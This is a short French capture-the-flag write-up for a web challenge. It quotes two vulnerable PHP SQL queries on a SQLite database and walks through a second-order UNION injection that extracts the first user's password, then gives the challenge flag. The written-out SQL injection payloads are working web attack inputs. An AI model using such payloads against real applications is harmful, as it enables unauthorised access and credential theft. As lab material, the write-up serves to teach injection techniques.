# Web 150 - La route est longue

On a une nouvelle injection SQL avec le code source de l’épreuve, celui-ci contient 2 requêtes SQL.
```php
$q = "select id from users where login = '". $login ."'";  Où $login est un champ utilisateur.
 
$q = "select email from admin_list where id_user = $id"; Où $id est le résultat de la requete précédente.```

Ici nous sommes en présence d’une base de données SQLITE il nous est donc assez difficile de faire une
injection basée sur le temps (bien que ce soit possible en soumettant une requête qui réalise plusieurs
calculs). 

L’idée ici est d’injecter dans le champ login pour injecter la seconde requête.
```sql
‘union all select “-1 union all select ‘toto’” -- a-
```

La page nous retourne toto qui correspond à l’email récupérée dans la 2ème requête SQL. On récupère
le mot de passe du premier utilisateur dans la table users:

```sql
union all select "0 union all select password from users limit 0,1"-- a-
```


Le flag est le mot de passe de l’administrateur : **ese{time_Or_Routed?}**